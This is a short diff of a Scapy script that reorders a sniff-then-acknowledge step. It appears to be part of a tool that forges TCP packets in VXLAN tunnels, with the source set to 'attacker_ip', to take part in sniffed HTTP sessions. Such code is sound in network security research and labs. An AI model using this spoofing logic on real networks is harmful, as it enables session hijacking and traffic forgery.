@@ -222,6 +222,9 @@ def psh_ack_do(packet):
         print("")
     return
 
+# Auf jedes erhaltene Paket muss ein ACK geschickt werden
+sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & PSH, prn=psh_ack_do, count = 1)
+
 #$$$$$ SEND ACK on PSH/ACK
 ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=psh_ack_dport,seq=psh_ack_ack, ack=psh_ack_seq + 1, flags='A')
 out_ack = send(ack, verbose=0)
@@ -232,8 +235,7 @@ if debug:
         print("SEQ# = " + str(syn_ack_ack))
         print("")
 
-# Auf jedes erhaltene Paket muss ein ACK geschickt werden
-sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & PSH, prn=psh_ack_do, count = 1)
+
 
 
 
